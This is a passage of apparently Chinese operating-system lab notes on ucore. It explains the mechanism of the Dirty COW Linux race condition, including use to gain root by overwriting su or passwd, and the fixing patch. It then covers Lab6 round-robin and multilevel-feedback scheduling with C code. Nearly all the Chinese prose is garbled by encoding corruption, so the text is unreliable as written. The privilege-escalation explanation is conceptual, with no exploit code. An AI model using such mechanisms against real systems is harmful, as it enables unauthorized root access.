‡è®°çš„åªè¯»æ–‡ä»¶æ˜ å°„åŒºåŸŸå†™æ•°æ®æ—¶ï¼Œä¼šäº§ç”Ÿä¸€ä¸ªæ˜ å°„æ–‡ä»¶çš„å¤åˆ¶(COW)ï¼Œå¯¹æ­¤åŒºåŸŸçš„ä»»ä½•ä¿®æ”¹éƒ½ä¸ä¼šå†™å›åŸæ¥çš„æ–‡ä»¶ï¼Œå¦‚æœä¸Šè¿°çš„ç«æ€æ¡ä»¶å‘ç”Ÿï¼Œå°±èƒ½æˆåŠŸçš„å†™å›åŸæ¥çš„æ–‡ä»¶ã€‚æ¯”å¦‚æˆ‘ä»¬ä¿®æ”¹suæˆ–è€…passwdç¨‹åºå°±å¯ä»¥è¾¾åˆ°rootææƒçš„ç›®çš„ã€‚</p><h5 id="0x02-POCåˆ†æ"><a href="#0x02-POCåˆ†æ" class="headerlink" title="0x02 POCåˆ†æ"></a>0x02 POCåˆ†æ</h5><p>é¦–å…ˆæ‰“å¼€æˆ‘ä»¬éœ€è¦ä¿®æ”¹çš„åªè¯»æ–‡ä»¶å¹¶ä½¿ç”¨<code>MAP_PRIVATE</code>æ ‡è®°æ˜ å°„æ–‡ä»¶åˆ°å†…å­˜åŒºåŸŸï¼Œç„¶åå¯åŠ¨ä¸¤ä¸ªçº¿ç¨‹ï¼š</p><ul><li>å…¶ä¸­ä¸€ä¸ªçº¿ç¨‹å‘æ–‡ä»¶æ˜ å°„çš„å†…å­˜åŒºåŸŸå†™æ•°æ®ï¼Œè¿™æ—¶å†…æ ¸é‡‡ç”¨COWæœºåˆ¶ã€‚</li><li>å¦ä¸€ä¸ªçº¿ç¨‹ä½¿ç”¨å¸¦MADV_DONTNEEDå‚æ•°çš„madviseç³»ç»Ÿè°ƒç”¨å°†æ–‡ä»¶æ˜ å°„å†…å­˜åŒºåŸŸé‡Šæ”¾ï¼Œè¾¾åˆ°å¹²æ‰°å¦ä¸€ä¸ªçº¿ç¨‹çš„COWè¿‡ç¨‹ï¼Œäº§ç”Ÿç«æ€æ¡ä»¶ï¼Œ</li></ul><p>å½“ç«æ€æ¡ä»¶å‘ç”Ÿæ—¶å°±èƒ½å†™å…¥æ–‡ä»¶æˆåŠŸã€‚</p><h5 id="0x03-å¤§è‡´æµç¨‹"><a href="#0x03-å¤§è‡´æµç¨‹" class="headerlink" title="0x03 å¤§è‡´æµç¨‹"></a>0x03 å¤§è‡´æµç¨‹</h5><p>å½“æˆ‘ä»¬ç”¨mmapå»æ˜ å°„æ–‡ä»¶åˆ°å†…å­˜åŒºåŸŸæ—¶ä½¿ç”¨äº†<code>MAP_PRIVATE</code>æ ‡è®°ï¼Œæˆ‘ä»¬å†™æ–‡ä»¶æ—¶ä¼šå†™åˆ°COWæœºåˆ¶äº§ç”Ÿçš„å†…å­˜åŒºåŸŸä¸­ï¼ŒåŸæ–‡ä»¶ä¸å—å½±å“ã€‚å…¶ä¸­è·å–ç”¨æˆ·è¿›ç¨‹å†…å­˜é¡µçš„è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><ol><li>ç¬¬ä¸€æ¬¡è°ƒç”¨<code>follow_page_mask</code>æŸ¥æ‰¾è™šæ‹Ÿåœ°å€å¯¹åº”çš„pageï¼Œå¸¦æœ‰<code>FOLL_WRITE</code>æ ‡è®°ã€‚å› ä¸ºæ‰€åœ¨pageä¸åœ¨å†…å­˜ä¸­ï¼Œ<code>follow_page_mask</code>è¿”å›NULLï¼Œç¬¬ä¸€æ¬¡å¤±è´¥ï¼Œè¿›å…¥<code>faultin_page</code>ï¼Œæœ€ç»ˆè¿›å…¥<code>do_cow_fault</code>åˆ†é…ä¸å¸¦<code>_PAGE_RW</code>æ ‡è®°çš„åŒ¿åå†…å­˜é¡µï¼Œè¿”å›å€¼ä¸º0ã€‚</li><li>é‡æ–°å¼€å§‹å¾ªç¯ï¼Œç¬¬äºŒæ¬¡è°ƒç”¨<code>follow_page_mask</code>ï¼Œå¸¦æœ‰<code>FOLL_WRITE</code>æ ‡è®°ã€‚ç”±äºä¸æ»¡è¶³<code>((flags &amp; FOLL_WRITE) &amp;&amp; !pte_write(pte))</code>æ¡ä»¶ï¼Œ<code>follow_page_mask</code>è¿”å›NULLï¼Œç¬¬äºŒæ¬¡å¤±è´¥ï¼Œè¿›å…¥<code>faultin_page</code>ï¼Œæœ€ç»ˆè¿›å…¥<code>do_wp_page</code>å‡½æ•°åˆ†é…COWé¡µã€‚å¹¶åœ¨ä¸Šçº§å‡½æ•°<code>faultin_page</code>ä¸­å»æ‰<code>FOLL_WRITE</code>æ ‡è®°,è¿”å›0ã€‚</li><li>é‡æ–°å¼€å§‹å¾ªç¯ï¼Œç¬¬ä¸‰æ¬¡è°ƒç”¨<code>follow_page_mask</code>ï¼Œä¸å¸¦<code>FOLL_WRITE</code>æ ‡è®°ã€‚æˆåŠŸå¾—åˆ°pageã€‚</li></ol><p>äº§ç”Ÿç«æ€æ¡ä»¶:</p><ol><li>ç¬¬ä¸€æ¬¡<code>follow_page_mask(FOLL_WRITE)</code>ï¼Œpageä¸åœ¨å†…å­˜ä¸­ï¼Œè¿›è¡Œpagefaultå¤„ç†ã€‚</li><li>ç¬¬äºŒæ¬¡<code>follow_page_mask(FOLL_WRITE)</code>ï¼Œpageæ²¡æœ‰å†™æƒé™ï¼Œ**å¹¶å»æ‰<code>FOLL_WRITE</code>**ã€‚</li><li>å¦ä¸€ä¸ªçº¿ç¨‹é‡Šæ”¾ä¸Šä¸€æ­¥åˆ†é…çš„COWé¡µ</li><li>ç¬¬ä¸‰æ¬¡<code>follow_page_mask(æ— FOLL_WRITE)</code>ï¼Œpageä¸åœ¨å†…å­˜ä¸­ï¼Œè¿›è¡Œpagefaultå¤„ç†ã€‚</li><li>ç¬¬å››æ¬¡<code>follow_page_mask(æ— FOLL_WRITE)</code>,æˆåŠŸè¿”å›pageï¼Œä½†æ²¡æœ‰ä½¿ç”¨COWæœºåˆ¶ã€‚</li></ol><h3 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h3><p><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=19be0eaffa3ac7d8eb6784ad9bdbc7d67ed8e619">patch é“¾æ¥</a></p><p>ç°åœ¨ä¸å†æ˜¯æŠŠ FOLL_WRITE æ ‡è®°å»æ‰ï¼Œè€Œæ˜¯æ·»åŠ äº†ä¸€ä¸ª FOLL_COW æ ‡å¿—æ¥è¡¨ç¤ºè·å–ä¸€ä¸ª COW åˆ†é…çš„é¡µã€‚å³ä½¿æ˜¯ç«æ€æ¡ä»¶ç ´åäº†ä¸€æ¬¡å®Œæ•´çš„è·å–é¡µçš„è¿‡ç¨‹ï¼Œä½†æ˜¯å› ä¸º FOLL_WRITE æ ‡å¿—è¿˜åœ¨ï¼Œæ‰€ä»¥ä¼šé‡å¤´å¼€å§‹åˆ†é…ä¸€ä¸ª COW é¡µï¼Œä»è€Œä¿è¯è¯¥è¿‡ç¨‹çš„å®Œæ•´æ€§ã€‚</p><h1 id="Lab6"><a href="#Lab6" class="headerlink" title="Lab6"></a>Lab6</h1><h2 id="çŸ¥è¯†ç‚¹-5"><a href="#çŸ¥è¯†ç‚¹-5" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h2><h3 id="0-é¡¹ç›®ç»„æˆ-2"><a href="#0-é¡¹ç›®ç»„æˆ-2" class="headerlink" title="0.é¡¹ç›®ç»„æˆ"></a>0.é¡¹ç›®ç»„æˆ</h3><p>ç›¸å¯¹ä¸å®éªŒäº”ï¼Œå®éªŒå…­ä¸»è¦å¢åŠ çš„æ–‡ä»¶å¦‚ä¸Šè¡¨çº¢è‰²éƒ¨åˆ†æ‰€ç¤ºï¼Œä¸»è¦ä¿®æ”¹çš„æ–‡ä»¶å¦‚ä¸Šè¡¨ç´«è‰²éƒ¨åˆ†æ‰€ç¤ºã€‚ä¸»è¦æ”¹åŠ¨å¦‚ä¸‹ï¼š ç®€å•è¯´æ˜å¦‚ä¸‹ï¼š</p><ul><li>libs/skew_heap.h: æä¾›äº†åŸºæœ¬çš„ä¼˜å…ˆé˜Ÿåˆ—æ•°æ®ç»“æ„ï¼Œä¸ºæœ¬æ¬¡å®éªŒæä¾›äº†æŠ½è±¡æ•°æ®ç»“æ„æ–¹é¢çš„æ”¯æŒã€‚</li><li>kern/process/proc.[ch]ï¼šproc.hä¸­æ‰©å±•äº†proc_structçš„æˆå‘˜å˜é‡ï¼Œç”¨äºRRå’Œstrideè°ƒåº¦ç®—æ³•ã€‚proc.cä¸­å®ç°äº†lab6_set_priorityï¼Œç”¨äºè®¾ç½®è¿›ç¨‹çš„ä¼˜å…ˆçº§ã€‚</li><li>kern/schedule/{sched.h,sched.c}: å®šä¹‰äº† ucore çš„è°ƒåº¦å™¨æ¡†æ¶ï¼Œå…¶ä¸­åŒ…æ‹¬ç›¸å…³çš„æ•°æ®ç»“æ„ï¼ˆåŒ…æ‹¬è°ƒåº¦å™¨çš„æ¥å£å’Œè¿è¡Œé˜Ÿåˆ—çš„ç»“æ„ï¼‰ï¼Œå’Œå…·ä½“çš„è¿è¡Œæ—¶æœºåˆ¶ã€‚</li><li>kern/schedule/{default_sched.h,default_sched.c}: å…·ä½“çš„ round-robin ç®—æ³•ï¼Œåœ¨æœ¬æ¬¡å®éªŒä¸­ä½ éœ€è¦äº†è§£å…¶å®ç°ã€‚</li><li>kern/schedule/default_sched_stride_c: Stride Schedulingè°ƒåº¦å™¨çš„åŸºæœ¬æ¡†æ¶ï¼Œåœ¨æ­¤æ¬¡å®éªŒä¸­ä½ éœ€è¦å¡«å……å…¶ä¸­çš„ç©ºç™½éƒ¨åˆ†ä»¥å®ç°ä¸€ä¸ªå®Œæ•´çš„ Stride è°ƒåº¦å™¨ã€‚</li><li>kern/syscall/syscall.[ch]: å¢åŠ äº†sys_gettimeç³»ç»Ÿè°ƒç”¨ï¼Œä¾¿äºç”¨æˆ·è¿›ç¨‹è·å–å½“å‰æ—¶é’Ÿå€¼ï¼›å¢åŠ äº†sys_lab6_set_priorityç³»ç»Ÿè°ƒç”¨ï¼Œä¾¿äºç”¨æˆ·è¿›ç¨‹è®¾ç½®è¿›ç¨‹ä¼˜å…ˆçº§ï¼ˆç»™priority.cç”¨ï¼‰</li><li>user/{matrix.c,priority.c,. . . }: ç›¸å…³çš„ä¸€äº›æµ‹è¯•ç”¨æˆ·ç¨‹åºï¼Œæµ‹è¯•è°ƒåº¦ç®—æ³•çš„æ­£ç¡®æ€§ï¼Œuserç›®å½•ä¸‹åŒ…å«ä½†ä¸é™äºè¿™äº›ç¨‹åºã€‚åœ¨å®Œæˆå®éªŒè¿‡ç¨‹ä¸­ï¼Œå»ºè®®é˜…è¯»è¿™äº›æµ‹è¯•ç¨‹åºï¼Œä»¥äº†è§£è¿™äº›ç¨‹åºçš„è¡Œä¸ºï¼Œä¾¿äºè¿›è¡Œè°ƒè¯•ã€‚</li></ul><h3 id="1-æµç¨‹æ¦‚è¿°"><a href="#1-æµç¨‹æ¦‚è¿°" class="headerlink" title="1.æµç¨‹æ¦‚è¿°"></a>1.æµç¨‹æ¦‚è¿°</h3><p>å®éªŒä¸­æ¶‰åŠäº†idleè¿›ç¨‹çš„æ¦‚å¿µã€‚å½“cpuæ²¡æœ‰è¿›ç¨‹å¯ä»¥æ‰§è¡Œçš„æ—¶å€™ï¼Œç³»ç»Ÿåº”è¯¥å¦‚ä½•å·¥ä½œï¼Ÿåœ¨å®éªŒäº”çš„schedulerå®ç°ä¸­ï¼Œucoreå†…æ ¸ä¸æ–­çš„éå†è¿›ç¨‹æ± ï¼Œç›´åˆ°æ‰¾åˆ°ç¬¬ä¸€ä¸ªrunnableçŠ¶æ€çš„ processï¼Œè°ƒç”¨å¹¶æ‰§è¡Œå®ƒã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“ç³»ç»Ÿæ²¡æœ‰è¿›ç¨‹å¯ä»¥æ‰§è¡Œçš„æ—¶å€™ï¼Œå®ƒä¼šæŠŠæ‰€æœ‰ cpu æ—¶é—´ç”¨åœ¨æœç´¢è¿›ç¨‹æ± ï¼Œä»¥å®ç° idleçš„ç›®çš„ã€‚ä½†æ˜¯è¿™æ ·çš„è®¾è®¡ä¸è¢«å¤§å¤šæ•°æ“ä½œç³»ç»Ÿæ‰€é‡‡ç”¨ï¼ŒåŸå› åœ¨äºå®ƒå°†è¿›ç¨‹è°ƒåº¦å’Œ idle è¿›ç¨‹ä¸¤ç§ä¸åŒçš„æ¦‚å¿µæ··åœ¨äº†ä¸€èµ·ï¼Œè€Œä¸”ï¼Œå½“è°ƒåº¦å™¨æ¯”è¾ƒå¤æ‚æ—¶ï¼Œschedule å‡½æ•°æœ¬èº«ä¹Ÿä¼šæ¯”è¾ƒå¤æ‚ï¼Œè¿™æ ·çš„è®¾è®¡ç»“æ„å¾ˆä¸æ¸…æ™°è€Œä¸”éš¾å…ä¼šå‡ºç°é”™è¯¯ã€‚æ‰€ä»¥åœ¨æ­¤æ¬¡å®éªŒä¸­ï¼Œucoreå»ºç«‹äº†ä¸€ä¸ªå•ç‹¬çš„è¿›ç¨‹(kern/process/proc.c ä¸­çš„ idleproc)ä½œä¸º cpu ç©ºé—²æ—¶çš„ idle è¿›ç¨‹ï¼Œè¿™ä¸ªç¨‹åºæ˜¯é€šå¸¸ä¸€ä¸ªæ­»å¾ªç¯ã€‚ä½ éœ€è¦äº†è§£è¿™ä¸ªç¨‹åºçš„å®ç°ã€‚</p><h3 id="2-æ–°å¢çš„å†…å®¹"><a href="#2-æ–°å¢çš„å†…å®¹" class="headerlink" title="2.æ–°å¢çš„å†…å®¹"></a>2.æ–°å¢çš„å†…å®¹</h3><p>ucoreå®šä¹‰çš„è¿›ç¨‹æ§åˆ¶å—struct proc_structåŒ…å«äº†æˆå‘˜å˜é‡state,ç”¨äºæè¿°è¿›ç¨‹çš„è¿è¡ŒçŠ¶æ€ï¼Œè€Œrunningå’Œrunnableå…±äº«åŒä¸€ä¸ªçŠ¶æ€(state)å€¼PROC_RUNNABLEã€‚</p><p>Lab5ä¸­æœ‰ä¸€ä¸ªå…¨å±€å˜é‡<code>list_entry_t proc_list</code>, ç”¨æ¥å­˜æ”¾æ‰€æœ‰çš„è¿›ç¨‹, wakeup_proc()å‡½æ•°åªè¦è®¾ç½®è¿›ç¨‹ä¸ºPROC_RUNNABLE, ç„¶åè°ƒåº¦å‡½æ•°å†éå†proc_listå°±èƒ½å–å‡ºä¸‹ä¸€ä¸ªè¿›ç¨‹.</p><p>åœ¨Lab6ä¸­ï¼Œrunnableçš„è¿›ç¨‹ä¼šè¢«æ”¾åœ¨è¿è¡Œé˜Ÿåˆ—<code>struct run_queue *rq</code>ä¸­ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œä¸åŒä¹‹å¤„åœ¨äºå¤„äºrunningæ€çš„è¿›ç¨‹ä¸ä¼šæ”¾åœ¨è¿è¡Œé˜Ÿåˆ—ä¸­, ä¼šè¢«ç›´æ¥dequeue.</p><h2 id="ç»ƒä¹ -3"><a href="#ç»ƒä¹ -3" class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h2><h3 id="ç»ƒä¹ 0-1"><a href="#ç»ƒä¹ 0-1" class="headerlink" title="ç»ƒä¹ 0"></a>ç»ƒä¹ 0</h3><blockquote><p>å¡«å†™å‰å‡ ä¸ªlabçš„ä»£ç å¹¶ä¸”è¡¥å……ä¸€äº›å†…å®¹</p></blockquote><p>é‡åˆ°äº†å¤§é—®é¢˜, æœ€åcloneäº†è‚–ä½¬çš„Lab6, ç„¶åæ”¹æˆæˆ‘è‡ªå·±çš„ä»£ç æ‰è¿‡äº†ç¼–è¯‘. å®åœ¨æ— æ³•ç†è§£ä¸ºä»€ä¹ˆä¼šåœ¨check_pgfault()è¿™å‡½æ•°ä¸Šå‡ºé”™.</p><h3 id="ç»ƒä¹ 1-3"><a href="#ç»ƒä¹ 1-3" class="headerlink" title="ç»ƒä¹ 1"></a>ç»ƒä¹ 1</h3><blockquote><p>åˆ†æäº†è§£lab6é‡‡ç”¨RRè°ƒåº¦ç®—æ³•åçš„æ‰§è¡Œè¿‡ç¨‹</p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// The introduction of scheduling classes is borrrowed from Linux, and makes the </span><br><span class="hljs-comment">// core scheduler quite extensible. These classes (the scheduler modules) encapsulate </span><br><span class="hljs-comment">// the scheduling policies. </span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sched_class</span> &#123;</span><br>    <span class="hljs-comment">// the name of sched_class</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *name;<br>    <span class="hljs-comment">// Init the run queue</span><br>    <span class="hljs-keyword">void</span> (*init)(struct run_queue *rq);<br>    <span class="hljs-comment">// put the proc into runqueue, and this function must be called with rq_lock</span><br>    <span class="hljs-keyword">void</span> (*enqueue)(struct run_queue *rq, struct proc_struct *proc);<br>    <span class="hljs-comment">// get the proc out runqueue, and this function must be called with rq_lock</span><br>    <span class="hljs-keyword">void</span> (*dequeue)(struct run_queue *rq, struct proc_struct *proc);<br>    <span class="hljs-comment">// choose the next runnable task</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_struct</span> *(*<span class="hljs-title">pick_next</span>)(<span class="hljs-keyword">struct</span> <span class="hljs-title">run_queue</span> *<span class="hljs-title">rq</span>);</span><br>    <span class="hljs-comment">// dealer of the time-tick</span><br>    <span class="hljs-keyword">void</span> (*proc_tick)(struct run_queue *rq, struct proc_struct *proc);<br>    <span class="hljs-comment">/* for SMP support in the future</span><br><span class="hljs-comment">     *  load_balance</span><br><span class="hljs-comment">     *     void (*load_balance)(struct rq* rq);</span><br><span class="hljs-comment">     *  get some proc from this rq, used in load_balance,</span><br><span class="hljs-comment">     *  return value is the num of gotten proc</span><br><span class="hljs-comment">     *  int (*get_proc)(struct rq* rq, struct proc* procs_moved[]);</span><br><span class="hljs-comment">     */</span><br>&#125;;<br><br></code></pre></div></td></tr></table></figure><p>ä¸Šé¢çš„ä»£ç å³ä¸ºsched_class, å¦‚æœè¦ä½¿ç”¨å‡½æ•°æŒ‡é’ˆåªè¦sched_class-&gt;init(â€¦)è¿™æ ·å³å¯</p><p>æ—¶é—´ç‰‡è½®è½¬ç®—æ³•åœ¨os_kernel_lab\labcodes\lab6\kern\schedule\default_sched.cä¸­, ç»™æ¯ä¸ªè¿›ç¨‹åˆ†é…æ—¶é—´ç‰‡çš„FCFSç®—æ³•, ç®€å•çš„å…¥é˜Ÿå‡ºé˜Ÿ, RR_proc_tick()è‡ªå‡å‰©ä½™æ—¶é—´ç‰‡, åˆ¤æ–­æ˜¯å¦ä¸ºé›¶, è®¾ç½®need_resched=1ç­‰ç­‰, å¹¶ä¸å¤æ‚.</p><p>åœ¨å®éªŒæŠ¥å‘Šä¸­å®Œæˆï¼š</p><ul><li>è¯·ç†è§£å¹¶åˆ†æsched_classä¸­å„ä¸ªå‡½æ•°æŒ‡é’ˆçš„ç”¨æ³•ï¼Œå¹¶ç»“åˆRound Robin è°ƒåº¦ç®—æ³•æucoreçš„è°ƒåº¦æ‰§è¡Œè¿‡ç¨‹</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">schedule</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>    <span class="hljs-keyword">bool</span> intr_flag;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_struct</span> *<span class="hljs-title">next</span>;</span><br>    local_intr_save(intr_flag);  <span class="hljs-comment">//inhibit interrupt</span><br>    &#123;<br>        current-&gt;need_resched = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (current-&gt;state == PROC_RUNNABLE) &#123;<br>            <span class="hljs-comment">//change from list search to function</span><br>            sched_class_enqueue(current);<br>        &#125;<br>        <span class="hljs-keyword">if</span> ((next = sched_class_pick_next()) != <span class="hljs-literal">NULL</span>) &#123;<br>            sched_class_dequeue(next);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (next == <span class="hljs-literal">NULL</span>) &#123;<br>            next = idleproc;<br>        &#125;<br>        next-&gt;runs ++;<br>        <span class="hljs-keyword">if</span> (next != current) &#123;<br>            proc_run(next);<br>        &#125;<br>    &#125;<br>    local_intr_restore(intr_flag);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>é¦–å…ˆæ˜¯scheduleå‡½æ•°, ä»–è¢«è°ƒç”¨çš„å‡½æ•°åœ¨ä¸‹è¡¨:</p><table><thead><tr><th>ç¼–å·</th><th>ä½ç½®</th><th>åŸå› </th></tr></thead><tbody><tr><td>1</td><td>proc.c::do_exit</td><td>ç”¨æˆ·çº¿ç¨‹æ‰§è¡Œç»“æŸï¼Œä¸»åŠ¨æ”¾å¼ƒCPUæ§åˆ¶æƒã€‚</td></tr><tr><td>2</td><td>proc.c::do_wait</td><td>ç”¨æˆ·çº¿ç¨‹ç­‰å¾…å­è¿›ç¨‹ç»“æŸï¼Œä¸»åŠ¨æ”¾å¼ƒCPUæ§åˆ¶æƒã€‚</td></tr><tr><td>3</td><td>proc.c::init_main</td><td>1. initprocå†…æ ¸çº¿ç¨‹ç­‰å¾…æ‰€æœ‰ç”¨æˆ·è¿›ç¨‹ç»“æŸï¼Œå¦‚æœæ²¡æœ‰ç»“æŸï¼Œå°±ä¸»åŠ¨æ”¾å¼ƒCPUæ§åˆ¶æƒ; 2. initprocå†…æ ¸çº¿ç¨‹åœ¨æ‰€æœ‰ç”¨æˆ·è¿›ç¨‹ç»“æŸåï¼Œè®©kswapdå†…æ ¸çº¿ç¨‹æ‰§è¡Œ10æ¬¡ï¼Œç”¨äºå›æ”¶ç©ºé—²å†…å­˜èµ„æº</td></tr><tr><td>4</td><td>proc.c::cpu_idle</td><td>idleprocå†…æ ¸çº¿ç¨‹çš„å·¥ä½œå°±æ˜¯ç­‰å¾…æœ‰å¤„äºå°±ç»ªæ€çš„è¿›ç¨‹æˆ–çº¿ç¨‹ï¼Œå¦‚æœæœ‰å°±è°ƒç”¨scheduleå‡½æ•°</td></tr><tr><td>5</td><td>sync.h::lock</td><td>åœ¨è·å–é”çš„è¿‡ç¨‹ä¸­ï¼Œå¦‚æœæ— æ³•å¾—åˆ°é”ï¼Œåˆ™ä¸»åŠ¨æ”¾å¼ƒCPUæ§åˆ¶æƒ</td></tr><tr><td>6</td><td>trap.c::trap</td><td>å¦‚æœåœ¨å½“å‰è¿›ç¨‹åœ¨ç”¨æˆ·æ€è¢«æ‰“æ–­å»ï¼Œä¸”å½“å‰è¿›ç¨‹æ§åˆ¶å—çš„æˆå‘˜å˜é‡need_reschedè®¾ç½®ä¸º1ï¼Œåˆ™å½“å‰çº¿ç¨‹ä¼šæ”¾å¼ƒCPUæ§åˆ¶æƒ(<strong>è¿™ä¸ªæ„Ÿè§‰æŒºç‰¹åˆ«çš„, å¦‚æœéœ€è¦è¢«è°ƒåº¦, é‚£ä¹ˆåªè¦å› ä¸ºä¸ªä»€ä¹ˆè½¯ä¸­æ–­è·³è½¬åˆ°å†…æ ¸çŠ¶æ€è¿›è¡Œæ‰§è¡Œçš„æ—¶å€™å°±ä¼šæ”¾å¼ƒæ§åˆ¶æƒ. è¿™å®é™…ä¸Šä½“ç°äº†å¯¹ç”¨æˆ·è¿›ç¨‹çš„å¯æŠ¢å æ€§, è€Œä¸”æ˜¯éšæœºæŠ¢å </strong>)</td></tr></tbody></table><p>é€‰å–ä¸‹ä¸€ä¸ªå®Œæˆä¹‹å, nextå˜é‡ä½œä¸ºproc_run()çš„å‚æ•°è¿›è€Œæ‰§è¡Œnextä¸­çš„è¿›ç¨‹.</p><ul><li>è¯·åœ¨å®éªŒæŠ¥å‘Šä¸­ç®€è¦è¯´æ˜å¦‚ä½•è®¾è®¡å®ç°â€å¤šçº§åé¦ˆé˜Ÿåˆ—è°ƒåº¦ç®—æ³•â€œï¼Œç»™å‡ºæ¦‚è¦è®¾è®¡ï¼Œé¼“åŠ±ç»™å‡ºè¯¦ç»†è®¾è®¡</li></ul><p><strong>å¤šçº§åé¦ˆé˜Ÿåˆ—ç®—æ³•ï¼ˆMLFQ)</strong> </p><p>è¿›ç¨‹å¯<strong>åœ¨ä¸åŒé˜Ÿåˆ—é—´ç§»åŠ¨</strong>çš„å¤šçº§é˜Ÿåˆ—ç®—æ³•, æ—¶é—´ç‰‡å¤§å°éšä¼˜å…ˆçº§çº§åˆ«çš„å¢åŠ è€Œå¢åŠ ,<br>ä¾‹å¦‚è¿›ç¨‹åœ¨å½“å‰æ—¶é—´ç‰‡å†…æ²¡æœ‰å®Œæˆï¼Œåˆ™é™åˆ°ä¸‹ä¸€ä¸ªä¼˜å…ˆçº§ã€‚</p><p>ç‰¹å¾ï¼šCPUå¯†é›†å‹è¿›ç¨‹ä¼˜å…ˆçº§ä¸‹é™çš„å¾ˆå¿«ï¼ŒIOå¯†é›†å‹è¿›ç¨‹åœç•™åœ¨é«˜ä¼˜å…ˆçº§</p><p><strong>å¤§æ¦‚è®¾è®¡:</strong> </p><p>å¤šçº§åé¦ˆé˜Ÿåˆ—è¦æœ‰å¤šä¸ª<code>run_queue</code>, æ¯ä¸ªqueueçš„æ—¶é—´ç‰‡ä¸åŒ.</p><blockquote><p>å‡è®¾æœ‰ä¸‰ä¸ªrun_queue, rq0, rq1, rq2, å›ºå®šæ—¶é—´ç‰‡ä¸º5, é˜Ÿåˆ—é—´è°ƒåº¦ä½¿ç”¨RRç®—æ³•, æ—¶é—´ç‰‡é•¿åº¦ä¸º10, 8, 6</p></blockquote><ul><li><p>sched_init(): é¦–å…ˆlist_init()ä¸€ä¸‹ä¸‰ä¸ªrq, å°†å‡½æ•°æŒ‡é’ˆç»“æ„ä½“èµ‹å€¼ä¸€ä¸‹, è®¾ç½®å½“å‰rq=rq0</p></li><li><p>sched_class_proc_tick: åœ¨æ—¶é’Ÿä¸­æ–­é‡Œè¢«è°ƒç”¨, å¦‚æœå½“å‰æ—¶é—´ç‰‡ç”¨å®Œäº†, åˆ™è®¾ç½®need_reschedä¸º1</p></li><li><p>sched_pick_next: åˆ¤æ–­å½“å‰queueæ—¶é—´ç‰‡ä»¥åŠå½“å‰è¿›ç¨‹æ—¶é—´ç‰‡æ˜¯å¦ç”¨å®Œ, å‰è€…ç”¨å®Œåˆ™rqåˆ‡æ¢åˆ°ä¸‹ä¸€ä¸ªqueue, åè€…ç”¨å®Œrqä¸å˜, ä»rqå–å‡ºç¬¬ä¸€ä¸ªè¿›ç¨‹</p></li><li><p>sched_enqueue: é€šè¿‡run_timesåˆ¤æ–­ä¸ºCPUå¯†é›†æˆ–è€…IOå¯†é›†, é€šè¿‡è®¾å®šé˜ˆå€¼æ¥åŠ å…¥åˆ°ä¸‰ä¸ªä¸åŒçš„queueä¸­</p></li><li><p>sched_dequeue: deleteå°±å®Œäº‹äº†</p></li></ul><h3 id="ç»ƒä¹ 2-3"><a href="#ç»ƒä¹ 2-3" class="headerlink" title="ç»ƒä¹ 2"></a>ç»ƒä¹ 2</h3><p><a href="http://www.waldspurger.org/carl/papers/phd-mit-tr667.pdf">Lottery and Strideç®—æ³•è®ºæ–‡</a> | <a href="https://people.cs.umass.edu/~mcorner/courses/691J/papers/PS/waldspurger_stride/waldspurger95stride.pdf">èŠ‚é€‰é‡è¦çš„éƒ¨åˆ†</a> </p><p>uCoreçš„Round-Robinç®—æ³•å¯ä»¥ä¿è¯æ¯ä¸ªè¿›ç¨‹å¾—åˆ°çš„CPUèµ„æºæ˜¯ç›¸ç­‰çš„ï¼Œä½†æˆ‘ä»¬å¸Œæœ›è°ƒåº¦å™¨èƒ½å¤Ÿæ›´åŠ æ™ºèƒ½çš„ä¸ºæ¯ä¸ªè¿›ç¨‹åˆ†é…åˆç†çš„CPUèµ„æºï¼Œè®©<strong>æ¯ä¸ªè¿›ç¨‹å¾—åˆ°çš„æ—¶é—´èµ„æºä¸å®ƒä»¬çš„ä¼˜å…ˆçº§æˆæ­£æ¯”å…³ç³»</strong>ã€‚è€ŒStride Schedulingè°ƒåº¦ç®—æ³•å°±æ˜¯è¿™æ 